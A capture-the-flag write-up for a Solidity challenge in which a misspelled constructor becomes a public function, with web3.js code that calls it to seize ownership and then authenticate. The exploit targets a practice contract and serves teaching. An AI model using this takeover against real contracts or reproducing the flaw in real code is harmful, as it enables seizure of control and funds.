# 18. Assume ownership

To complete this challenge, become the `owner`.

## Target contract

```solidity
pragma solidity ^0.4.21;

contract AssumeOwnershipChallenge {
    address owner;
    bool public isComplete;

    function AssumeOwmershipChallenge() public {
        owner = msg.sender;
    }

    function authenticate() public {
        require(msg.sender == owner);

        isComplete = true;
    }
}
```

## Vulnerability

This issue is well known, it's not a technical issue but a language design that lead to silly mistakes with potentially big consequences. The contract name is `AssumeOwnershipChallenge`, its constructor should be named `AssumeOwnershipChallenge` but there is a typo as it is named `AssumeOwmershipChallenge` (typo in OwMership).

To take control of that contract we can simply call `AssumeOwmershipChallenge` that was supposed to be the constructor but happens to be a simple public function because of the typo:

```js
// CHANGE THIS FOR YOU CHALLENGE CONTRACT ADDRESS
const challengeContract = "0x77C1a906e757aAe8086FBfFacF8691E092C9FBCf";

const data = web3.eth.abi.encodeFunctionCall(
  {
    name: "AssumeOwmershipChallenge",
    type: "function",
    inputs: [],
  },
  []
);

await web3.eth.sendTransaction({
  from: accounts[0],
  to: challengeContract,
  data: data,
});
```

And call `authenticate` to validate the challenge :

```js
// CHANGE THIS FOR YOU CHALLENGE CONTRACT ADDRESS
const challengeContract = "0x77C1a906e757aAe8086FBfFacF8691E092C9FBCf";

const data = web3.eth.abi.encodeFunctionCall(
  {
    name: "authenticate",
    type: "function",
    inputs: [],
  },
  []
);

await web3.eth.sendTransaction({
  from: accounts[0],
  to: challengeContract,
  data: data,
});
```

You can submit the challenge !